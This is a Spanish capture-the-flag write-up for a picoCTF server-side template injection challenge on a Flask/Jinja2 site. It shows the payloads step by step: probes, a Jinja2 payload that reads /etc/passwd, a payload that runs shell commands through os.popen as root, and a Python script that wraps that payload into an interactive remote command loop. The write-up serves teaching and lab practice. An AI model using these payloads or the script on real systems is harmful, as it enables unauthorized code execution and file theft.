
![[logo_ssti1.png]]

Tags: #writeup #challenge  #HackingWeb #SSTI #Python-Jinja2 #RemoteAccessRCE #scriptAutomatizedCommandToOutput-Python

2026-01-21
## AYUDA

<iframe title="El Bug que Convierte Texto en CONTROL TOTAL" src="https://www.youtube.com/embed/ejimEVT6lY4?feature=oembed" height="113" width="200" style="aspect-ratio: 4 / 3; width: 100%; height: 100%;" allowfullscreen="" allow="fullscreen"></iframe>

## WRITE UP
Ejemplo: atlas:picoctf.net:51658 (víctima) TTL=  63 LINUX

### INTRODUCCIÓN

En este challenge explotaremos la vulnerabilidad [[SSTI]] cual trata de una vulnerabilidad que cuando insertemos ciertos payloads, se logren interpretar de forma insegura dentro de la plantilla que será procesada en el servidor.

La Página usa Python con motor de plantilla Jinja2 que usa Werkzeug (base para Flask). 

#### ANÁLISIS WEB: RECONOCNIMIENTO

Dentro de la página tenemos un párrafo que nos habla acerca de que podemos publicar cosas, seguido de un campo para introducir texto y enviarlo.

![[renw_ssti1.png]]

Vamos a ver como reacciona la página ante un texto normal.

![[text_ssti1.png]]

Nos lo refleja en la pantalla la salida.

![[reac_ssti1.png]]

##### POSIBLES VULNERABILIDADES

Si probamos con *XSS* **(CROSS-SITE SCRIPTING)** nos lo reflejara pero en esta máquina no hay cookies para robar **(Cookie Hijacking)**, ni tampoco podemos hacer nada a nivel servidor.

![[xss_ssti1.png]]

![[o_ssti1.png]]

##### WHATWEB

Haremos un reconocimiento a nivel web mediante [[whatweb]] para escanear tecnologías, lenguaje... de la página para ver por donde nos podemos aprovechar.

Usa <span style="color:cyan">Python</span> por lo que en la mayoría de casos y si tenemos suerte, se puede acontecer un `Server Side Template Injection`.

![[whatweb_ssti1.png]]

Una búsqueda en Google sobre que es **Werkzeug**:

![[werkzeug_ssti1.png]]

#### VULNERABILIDAD: SSTI  (SERVER SIDE TEMPLATE INJECTION)
Viendo esto ya nos podemos ver cual va a ser el objetivo para explotar este challenge

##### PYTHON: JINJA2 | TEST
Para saber como injectar código y así mismo que payload usar, nos iremos a este repositorio de GitHub cual contiene Payloads de todo: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/97cfeee270395a838802fa1fcb8a4d5ffc6d6b48/Server%20Side%20Template%20Injection#jinja2

Si vamos siguiendo el repositorio nos deja una serie de inyecciones cuales pueden que sea vulnerables dependiendo de nuestra necesidad, la nuestra ahora es probar si es vulnerable.

Probamos `{{4*4}}`, y si sale "16" quiere decir que es vulnerable.

![[mult_ssti1.png]]

Es vulnerable, efectivamente. Probamos con otro.

![[resp_ssti1.png]]

Probamos `{{7*'7'}}`, y tendría que salir "7777777".

![[otro_ssti1.png]]

Se acontece la inyección, exitosamente. Esto ya nos dice que se trata de una **plantilla Jinja2** o un motor compatible con este.

![[otror_ssti1.png]]

##### PYTHON: JINJA2 | READ REMOTE FILE

Ahora probaremos a intentar leer archivos a nivel sistema, cual sería muy crítico en caso que llegue a interpretarse.

Injectamos ``python {{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}``
y nos debería leer el archivo <span style="color:lightblue">/etc/</span>**passwd**.

![[rce_ssti1.png]]

Nos lo lee exitosamente.

![[passwd_ssti1.png]]

##### PYTHON: JINJA2 |  REMOTE CODE EXECUTION (RCE)

Por último nos queda probar a ejecutar de forma remota comandos. Hay varios, así hay que ir probando.

Probamos con: (Este nos ejecutara el comando **id**) 
``python {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}``

![[com_ssti1.png]]

Nos ejecuta el comando y encima estamos como usuario <span style="color:blue">root</span>.

![[idd_ssti1.png]]

#### SCRIPT PYTHON: AUTOMATIZAR COMANDOS

Crearemos un script en **Python** para ejecutar comandos de forma más cómoda en nuestra shell, desde el servidor a nuestro máquina a nivel local.

Lo que necesitaremos es "**CTRL + ALT + I**" > Herramientas de Desarrollador > Network.
Enviaremos la solicitud del Payload para ejecutar el comando nuevamente y en "announce" copiaremos la URL a cual se hace la Petición.

![[urlm_ssti1.png]]

También la solicitud que es la data que vamos a enviar, la necesitamos también.

![[conte_ssti1.png]]

Resultado del script en Python:

![[script_ssti1.png]]

Formato copiable:

````
#!/usr/bin/env python3  
  
import requests  
import re #Librería para el manejo de expresiones regulares  
  
main_url = "[http://rescued-float.picoctf.net:58464/announce](http://rescued-float.picoctf.net:58464/announce)" #Indicamos la URL principal  
  
while True: #Bucle infinito  
  
    user_input = input("[~] > ") #Tenemos que indicar el comando que comandos queremos ejecutar, que ira dentro de nuestro user_input  
  
    data_post = { #Indicar la Data que por POST vamos a enviar  
            "content": '{{self.__init__.__globals__.__builtins__.__import__("os").popen("' + user_input + '").read()}}' #El campo content valdrá el Payload que le pongamos.| los + no hacen falta  
    }  
  
    #print(data_post) Ver lo que vale post_data | no hace falta, solo para testear lo que vamos a enviar  
    r = [requests.post](http://requests.post/)(main_url, data=data_post) #Lanzar la solicitud por POST al servidor (main_url) y a nivel data, enviar la data definida, por POST  
    response = re.findall(r'align="center">(.*)</h1>', r.text, re.DOTALL)[0] #Indicar una regex a contemplar para la respuesta del lado del servidor. Entre parentesis indicamos la cadena y entre corchetes el primer elemento. Por último el dotall para que tenga en cuenta todos los saltos de línea.  
    print(response) #Mostrar la respuesta por parte del servidor, en este caso de response
````

#### BANDERA

La bandera estará en la ruta actual.

**cat** <span style="color:orange">flag</span>

![[flag_ssti1.png]]

